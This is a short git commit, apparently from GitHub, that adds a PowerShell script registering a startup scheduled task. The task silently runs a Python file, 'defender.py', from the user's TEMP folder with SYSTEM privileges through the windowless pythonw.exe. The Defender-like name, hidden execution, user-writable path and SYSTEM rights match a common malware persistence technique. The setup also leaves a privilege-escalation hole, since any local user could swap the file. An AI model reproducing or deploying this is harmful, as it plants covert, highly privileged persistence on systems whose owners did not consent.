d302ecfd3a7b3adaca531ee9ebea53e3870709ca
ashwanthcreators <85355780+ashwanthcreators@users.noreply.github.com>
2024-01-23 17:15:06 +0530

    Update ConfigureScheduledTask.ps1

--- ConfigureScheduledTask.ps1
+++ ConfigureScheduledTask.ps1
@@ -1,1 +1,5 @@
-
+$ScriptPath = Join-Path $env:TEMP 'defender.py'
+$Action = New-ScheduledTaskAction -Execute 'pythonw.exe' -Argument "`"$ScriptPath`""
+$Trigger = New-ScheduledTaskTrigger -AtStartup
+$TaskName = 'RunDefenderScriptAtStartup'
+Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName $TaskName -User 'NT AUTHORITY\SYSTEM' -Force
